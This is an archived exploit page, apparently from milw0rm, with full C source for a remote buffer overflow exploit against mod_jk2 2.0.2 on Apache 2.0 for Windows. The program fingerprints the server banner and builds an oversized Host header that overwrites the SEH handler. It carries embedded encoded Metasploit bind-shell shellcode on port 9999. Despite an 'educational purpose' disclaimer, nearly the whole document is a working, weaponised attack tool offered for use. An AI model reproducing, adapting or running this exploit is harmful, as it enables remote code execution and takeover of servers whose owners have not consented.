<html><head><title>mod_jk2 v2.0.2 for Apache 2.0 Remote Buffer Overflow Exploit (win32)</title></head><pre>/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : mod_jk2 v2.0.2 for Apache 2.0 Win32  
* Found by       : IOActive Security Advisory
* ----------------------------------------
* Exploit        : mod_jk2 v2.0.2 Buffer Overflow Exploit (win32)
* Exploit date   : 01.03.2008 - 02.03.2008
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           : Exploit was found by IOActive Security Advisory, trivial exploit for win32.
*                  The only problem here is that the mod_jk2 forstly downcase all letter in Host
*                  header request, Metasploit v3 have solutions for this case:
*                     1. Use non-upper encoder
*                     2. Use non-alpha encoder
*                  i used the first variant here. and all is working good.
* ----------------------------------------
* Thanks to:
*       1. IOActive Security Advisory  (                                                        )
*       2. The Metasploit project      ( http://metasploit.com                                  ) 
*       3. Dreatica-FXP crew           (                                                        )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
************************************************************************************
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;ctime&gt;
#pragma comment(lib,&quot;ws2_32&quot;)


void usage(char * s);
void logo();
void end_logo();
void prepare_shellcode(unsigned char * fsh, int sh, char * cbip, int cbport, char * url);
void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh);
int get_version(char * remotehost, int port, int * itarget);
int validate_args(char * remotehost, int port, int sh, int itarget);
int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port);
SOCKET do_connect (char *remotehost, int port);


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------




struct _target{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	
	{&quot;mod_jk2/2.0.2 for Apache 2.0.48&quot;,  0x100115c3 },// pop,pop,ret	
	{NULL,                               0x00000000 }
};



struct {
	const char * name;
	int length;
	char * shellcode;	
}shellcodes[]={ 	
	{&quot;Bindshell, port 9999&quot;, 461, 		
	/*
	* windows/shell_bind_tcp - 461 bytes
	* http://www.metasploit.com
	* Encoder: x86/nonalpha
	* EXITFUNC=seh, LPORT=9999
	*/
		&quot;\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x6c\x8b\xd7\x3b&quot;
		&quot;\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb\xf1\xeb&quot;
		&quot;\x71\xe8\xe2\xff\xff\xff\x11\x2e\x0f\x36\x03\x2c\x32\x07\x27&quot;
		&quot;\x06\x15\x30\x0f\x1a\x17\x38\x0b\x13\x2d\x2b\x15\x28\x15\x13&quot;
		&quot;\x13\x04\x08\x27\x13\x2b\x15\x26\x11\x13\x24\x28\x28\x28\x28&quot;
		&quot;\x28\x38\x28\x38\x28\x15\x13\x15\x28\x13\x0b\x24\x11\x2a\x26&quot;
		&quot;\x13\x24\x28\x26\x13\x32\x32\x24\x2b\x27\x27\x26\x13\x02\x02&quot;
		&quot;\x24\x26\x15\x11\x17\x15\x13\x18\x0e\x11\x2b\x22\x11\x37\x39&quot;
		&quot;\x39\x01\x13\x09\x06\x37\x24\x29\x2a\x2a\x2a\x11\x2a\x2a\x26&quot;
		&quot;\x2a\x13\x28\x11\x24\x17\x29\x13\x28\xfc\x7b\xeb\x7b\xe8\xf9&quot;
		&quot;\xff\xff\xff\x60\x8b\x7b\x24\x24\x8b\x7b\x3c\x8b\x7c\x05\x7b&quot;
		&quot;\x01\xef\x8b\x7b\x18\x8b\x5f\x20\x01\xeb\x7b\x8b\x34\x8b\x01&quot;
		&quot;\xee\x31\xc0\x99\xac\x84\xc0\x7b\x07\xc1\xca\x0d\x01\xc2\xeb&quot;
		&quot;\xf4\x3b\x7b\x24\x28\x7b\xe5\x8b\x5f\x24\x01\xeb\x7b\x8b\x0c&quot;
		&quot;\x7b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x7b\x24\x1c\x7b\xc3&quot;
		&quot;\x31\xdb\x7b\x8b\x7b\x30\x8b\x40\x0c\x8b\x7b\x1c\xad\x8b\x40&quot;
		&quot;\x08\x5e\x7b\x8e\x7b\x0e\xec\x7b\xff\xd6\x7b\x7b\x7b\x7b\x33&quot;
		&quot;\x32\x7b\x7b\x7b\x32\x5f\x7b\xff\xd0\x7b\xcb\xed\xfc\x3b\x7b&quot;
		&quot;\xff\xd6\x5f\x89\xe5\x7b\x81\xed\x08\x02\x7b\x7b\x02\xff\xd0&quot;
		&quot;\x7b\xd9\x09\xf5\xad\x7b\xff\xd6\x7b\x7b\x7b\x7b\x7b\x7b\x7b&quot;
		&quot;\x7b\x7b\xff\xd0\x7b\x7b\x27\x0f\x7b\x7b\x89\xe1\x95\x7b\xa4&quot;
		&quot;\x1a\x7b\xc7\x7b\xff\xd6\x7b\x10\x7b\x7b\xff\xd0\x7b\xa4\xad&quot;
		&quot;\x2e\xe9\x7b\xff\xd6\x7b\x7b\xff\xd0\x7b\xe5\x7b\x86\x7b\x7b&quot;
		&quot;\xff\xd6\x7b\x7b\x7b\x7b\xff\xd0\x93\x7b\xe7\x7b\xc6\x7b\x7b&quot;
		&quot;\xff\xd6\x7b\xff\xd0\x7b\x7b\x7b\x7b\x7b\x7b\x7b\x89\xe5\x7b&quot;
		&quot;\x7b\x7b\x29\xcc\x89\xe7\x7b\x7b\x89\xe2\x31\xc0\xf3\xaa\xfe&quot;
		&quot;\x7b\x2d\xfe\x7b\x2c\x93\x8d\x7b\x38\xab\xab\xab\x7b\x7b\xfe&quot;
		&quot;\xb3\x16\xff\x7b\x7b\xff\xd6\x5b\x7b\x7b\x7b\x7b\x7b\x7b\x01&quot;
		&quot;\x7b\x7b\x7b\x7b\xff\xd0\x7b\xad\xd9\x05\xce\x7b\xff\xd6\x7b&quot;
		&quot;\xff\xff\x37\xff\xd0\x8b\x7b\xfc\x83\xc4\x7b\xff\xd6\x7b\xff&quot;
		&quot;\xd0\x7b\xf0\x8a\x04\x5f\x7b\xff\xd6\xff\xd0&quot;
	 },	  
	{NULL , NULL }
};








int main(int argc, char **argv)
{
	char * remotehost=NULL;
	char default_remotehost[]=&quot;127.0.0.1&quot;;	
	char temp1[100], temp2[100];
	int port, itarget, x, sh;
	SOCKET s;
	char c;	
	int option_index=0;
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &amp;wsa);
	if(argc&lt;2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	port=80;
	itarget=-1;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, &quot;h:p:&quot;))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 				
			case 'p':
				sscanf(optarg, &quot;%d&quot;, &amp;port);
				break;			
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		 
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(&quot; #  Host    : %s%s# \n&quot;, remotehost, temp1);	
	sprintf(temp2, &quot;%d&quot;, port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(&quot; #  Port    : %s%s# \n&quot;, temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, &quot;%s&quot;, shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(&quot; #  Payload : %s%s# \n&quot;, temp2, temp1);	


	printf(&quot; # ------------------------------------------------------------------- # \n&quot;);
	fflush(stdout);
	printf(&quot;   [+] Checking if server is online\n&quot;);
	fflush(stdout);
	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf(&quot;   [-] Server is OFFLINE\n&quot;);
		end_logo();
		return 0;
	}
	closesocket(s);
	printf(&quot;   [+] Server is ONLINE\n&quot;);

	x = get_version(remotehost, port, &amp;itarget);
	if(x&lt;0)
	{
		printf(&quot;   [-] Cannot exploit due to errors\n&quot;);
		WSACleanup();
		end_logo();
		return -1;		
	}
		
		
	unsigned char buf[10000];
	unsigned int len;
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	make_buffer(buf, &amp;len, itarget, sh);

	printf(&quot;   [+] Attacking buffer constructed\n&quot;);

	if(send_buffer(buf, len, remotehost,port)==-1)
	{
		printf(&quot;   [-] Cannot exploit server %s\n&quot;, remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf(&quot;   [+] Buffer sent\n&quot;);
	printf(&quot;   [+] Connect to %s:%d\n&quot;, remotehost, 9999);
		
	end_logo();
	WSACleanup();
	return 0;
}



SOCKET do_connect (char *remotehost, int port)
{
	static struct hostent *host;
	static struct sockaddr_in addr;
	SOCKET s;	
	host = gethostbyname(remotehost);
	if (!host)
	{
		perror(&quot;   [-] gethostbyname() failed&quot;);
		return -1;
	}
	addr.sin_addr = *(struct in_addr*)host-&gt;h_addr;

	s = socket(PF_INET, SOCK_STREAM, 0);
	if (s == -1)
	{
		closesocket(s);
		perror(&quot;socket() failed&quot;);
		return -1;
	}
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	if (connect(s, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1)
	{
		closesocket(s);     
		return -1;
	}
	return s;
}



int get_version(char * remotehost, int port, int * target)
{
	
	char bufmax[4096], * lp, *lp2, WebBanner[1000], Version[1000], ModJK[1000];
	int bytes,j,x;
	SOCKET sock;

	memset(bufmax,0,sizeof(bufmax));
	memset(WebBanner,0,sizeof(WebBanner));
	memset(Version,0,sizeof(Version));
	memset(ModJK,0,sizeof(ModJK));
	sock = do_connect(remotehost, port);

	if (sock == -1) return -1;
	send(sock, &quot;GET /a.html HTTP/1.0\r\n\r\n&quot;,(int)strlen(&quot;GET /a.html HTTP/1.0\r\n\r\n&quot;),0);
	
	if ((bytes = recv(sock, bufmax, sizeof(bufmax),0 )) &lt;= 0) return -1;
	bufmax[sizeof(bufmax)-1]=0;

	if((lp=strstr(bufmax,&quot;Server:&quot;))==NULL) return -1;
	if((lp2=strstr(lp,&quot;\r\n&quot;))==NULL) return -1;

	strncpy(WebBanner, lp, lp2-lp);
	if((lp=strstr(WebBanner,&quot;Win32&quot;))==NULL) 
	{
		printf(&quot;   [-] OS is not a Win32\n&quot;);
		return -1;
	}

	if((lp=strstr(WebBanner,&quot;Apache/&quot;))==NULL)
	{
		printf(&quot;   [-] No Apache\n&quot;);
		return -1;
	}
	if(lp+strlen(&quot;Apache/&quot;)&gt;WebBanner+strlen(WebBanner)-1) return -1;
	lp+=strlen(&quot;Apache/&quot;);
	if((lp2=strstr(lp,&quot; &quot;))==NULL) return -1;

	strncpy(Version, lp, lp2-lp);

	printf(&quot;   [+] Version of Apache is %s\n&quot;, Version);

	x=0;
	for(j=0; targets[j].t!=0;j++)
	{
		if(strstr(targets[j].t,Version)!=NULL)
		{			
			x=1;
			break;
		}
	}
	if(x==0)
	{
		printf(&quot;   [-] This version of Apache is UNSUPPORTED\n&quot;);
		return -1;
	}
	printf(&quot;   [+] This version of Apache is SUPPORTED\n&quot;);

	strncpy(WebBanner, lp, lp2-lp);

	if((lp=strstr(WebBanner,&quot;mod_jk2/&quot;))==NULL) 
	{
		printf(&quot;   [-] No mod_jk2\n&quot;);
		return -1;
	}
	if((lp2=strstr(lp,&quot; &quot;))==NULL) lp2=WebBanner+strlen(WebBanner);

	strncpy(ModJK, lp, lp2-lp);

	printf(&quot;   [+] mod_jk2 is %s\n&quot;, ModJK);
	x=0;
	for(j=0; targets[j].t!=0;j++)
	{
		if(strstr(targets[j].t,ModJK)!=NULL)
		{
			*target=j;
			x=1;
			break;
		}
	}
	if(x==0)
	{
		printf(&quot;   [-] This version of mod_jk2 is UNSUPPORTED\n&quot;);
		return -1;
	}
	printf(&quot;   [+] This version of mod_jk2 is SUPPORTED\n&quot;);
	return 0;
}


void prepare_shellcode(unsigned char * fsh, unsigned int * fshlength, int sh)
{
	memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
	*fshlength = shellcodes[sh].length;	
}

void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh)
{
		// prepare shellcode
	unsigned char fsh[10000];	
	unsigned int fshlength;
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, &amp;fshlength, sh);
	// -----------------

		// make buffer
	unsigned char * cp=buf;

		// begin of the HTTP request
	memcpy(cp, &quot;GET / HTTP/1.0\r\nHost: &quot;, strlen(&quot;GET / HTTP/1.0\r\nHost: &quot;) );		
	cp+=strlen((char *)cp);
	
		// jff
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\x90';

		// overflowing
	memset(cp, '\x41', 5001);

		// put the shellcode
	memcpy(cp, fsh, fshlength);
	cp+=1271;

		// calculating backward jump
	int jmp_bytes=0xffffffff - (1275);

		// putting backward jump
	*cp++ = '\xe9';	
	*cp++ = (char)((jmp_bytes      ) &amp; 0xff);
	*cp++ = (char)((jmp_bytes &gt;&gt;  8) &amp; 0xff);
	*cp++ = (char)((jmp_bytes &gt;&gt; 16) &amp; 0xff);
	*cp++ = (char)((jmp_bytes &gt;&gt; 24) &amp; 0xff);

		// next SEH record and back jump
	*cp++='\x90';
	*cp++='\x90';
	*cp++='\xeb';
	*cp++='\xf7';

		// replace SEH
	*cp++ = (char)((targets[itarget].ret      ) &amp; 0xff);
	*cp++ = (char)((targets[itarget].ret &gt;&gt;  8) &amp; 0xff);
	*cp++ = (char)((targets[itarget].ret &gt;&gt; 16) &amp; 0xff);
	*cp++ = (char)((targets[itarget].ret &gt;&gt; 24) &amp; 0xff);

		// trigger exception
	cp+=3000;			

		// copy the last part of the request
	memcpy(cp, &quot;\r\n\r\n&quot;, strlen(&quot;\r\n\r\n&quot;) );		
	cp+=strlen((char *)cp);

}



int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port)
{	
	SOCKET sock;

	sock = do_connect(remotehost, port);
	
	if (sock&lt;0) return -1;
	if (send(sock, (char *)buf,(int)strlen((char *)buf),0)&lt;=0) return -1;
	
	closesocket(sock);
	return 1;
}






// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind &gt;= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind &lt; argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], &quot;--&quot;) == 0)
		{
			optind++;
			optarg = NULL;
			if (optind &lt; argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind &lt; argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------







void usage(char * s)
{	
	printf(&quot;\n&quot;);
	printf(&quot;    Usage: %s -h &lt;host&gt; -p &lt;port&gt;\n&quot;, s);
	printf(&quot;   -------------------------------------------------------------------\n&quot;);
	printf(&quot;    Arguments:\n&quot;);
	printf(&quot;      -h ........ host to attack\n&quot;);
	printf(&quot;      -p ........ port to use\n&quot;);	
	printf(&quot;\n&quot;);
	printf(&quot;    Supported mod_jk versions:\n&quot;);
	for(int j=0; targets[j].t!=0;j++)
	{
		printf(&quot;      %d. %s\n&quot;,j+1, targets[j].t);
	}					
	printf(&quot;\n&quot;);
	printf(&quot;    Execution: %s\n\n&quot;, shellcodes[0].name);			
	end_logo();	
}

void logo()
{
	printf(&quot;\n\n&quot;);
	printf(&quot; ####################################################################### \n&quot;);	
	printf(&quot; #     ____                 __  _                  ______  __    _____ #\n&quot;);
	printf(&quot; #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n&quot;);
	printf(&quot; #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n&quot;);
	printf(&quot; #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n&quot;);
	printf(&quot; # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n&quot;);
	printf(&quot; #                                 crew                                #\n&quot;);
	printf(&quot; ####################################################################### \n&quot;);	
	printf(&quot; #  Exploit : mod_jk2 v2.0.2 for Apache 2.0                            # \n&quot;);
	printf(&quot; #  Author  : Heretic2                                                 # \n&quot;);
	printf(&quot; #  THANKS  : IOActive and The Metasploit Project                      # \n&quot;);
	printf(&quot; #  Research: IOActive Security Advisory                               # \n&quot;);
	printf(&quot; #  Version : 1.0                                                      # \n&quot;);
	printf(&quot; #  System  : Windows ALL                                              # \n&quot;);
	printf(&quot; #  Date    : 01.03.2008 - 02.03.2008                                  # \n&quot;);
	printf(&quot; # ------------------------------------------------------------------- # \n&quot;);
}

void end_logo()
{
	printf(&quot; # ------------------------------------------------------------------- # \n&quot;);
	printf(&quot; #                    Dreatica-FXP crew [Heretic2]                     # \n&quot;);	
	printf(&quot; ####################################################################### \n\n&quot;);
}

// milw0rm.com [2008-03-31]</pre></html>